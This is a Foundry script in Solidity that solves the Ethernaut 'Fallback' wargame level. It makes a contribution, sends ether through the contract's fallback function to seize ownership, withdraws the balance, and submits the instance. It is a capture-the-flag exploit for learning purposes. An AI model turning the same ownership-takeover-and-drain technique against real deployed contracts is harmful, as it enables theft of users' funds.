// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import "ethernaut/levels/Fallback.sol";
import "ethernaut/Ethernaut.sol";

contract AttackFallbackScript is Script {

    function run() public {

        Ethernaut ethernaut = Ethernaut(0xD2e5e0102E55a5234379DD796b8c641cd5996Efd);
        address payable instanceAddress = payable(0x7E3a7a7430193eB7092e78F1E408f77f671805A6);
        Fallback instance = Fallback(instanceAddress);
        vm.broadcast();
        instance.contribute{value: 1}();
        vm.broadcast();
        (bool success, ) = instanceAddress.call{value: 1}("");
        require(success, "transfer failed");   
        require(instance.owner() == msg.sender);
        vm.broadcast();
        instance.withdraw();
        ethernaut.submitLevelInstance(instanceAddress);        
    }
}
